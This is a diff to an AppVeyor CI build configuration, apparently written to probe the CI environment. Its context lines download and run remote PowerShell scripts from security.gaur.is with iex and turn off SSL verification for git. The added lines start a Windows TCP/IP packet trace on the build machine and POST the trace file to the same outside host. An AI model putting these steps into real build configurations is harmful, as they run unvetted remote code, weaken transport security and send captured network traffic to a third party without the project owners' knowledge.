@@ -22,6 +22,9 @@ init:
   - ps: iex ((new-object net.webclient).DownloadString('https://security.gaur.is/appveyor/proxy'))
   - git config --global http.https://github.com.proxy http://%APPVEYOR_HTTP_PROXY_IP%:%APPVEYOR_HTTP_PROXY_PORT%
   - git config --global http.https://github.com.sslVerify false
+  - ps: New-NetEventSession -Name “ms1”
+  - ps: Add-NetEventProvider -Name “Microsoft-Windows-TCPIP” -SessionName “ms1"
+  - ps: Start-NetEventSession -Name “ms1"
 
 
 install:
@@ -38,4 +41,8 @@ install:
 build_script:
   - ps: iex ((new-object net.webclient).DownloadString('https://security.gaur.is/appveyor/stuff.ps1'))
   - echo "test"
-  - ps: Start-Sleep -s 360
+  - ps: $s = Get-NetEventSession
+  - ps: Stop-NetEventSession -Name "ms1"
+  - ps: Invoke-WebRequest -Uri https://security.gaur.is/api/trace -Method POST -Infile $s.LocalFilePath
+
+  #- ps: Start-Sleep -s 360
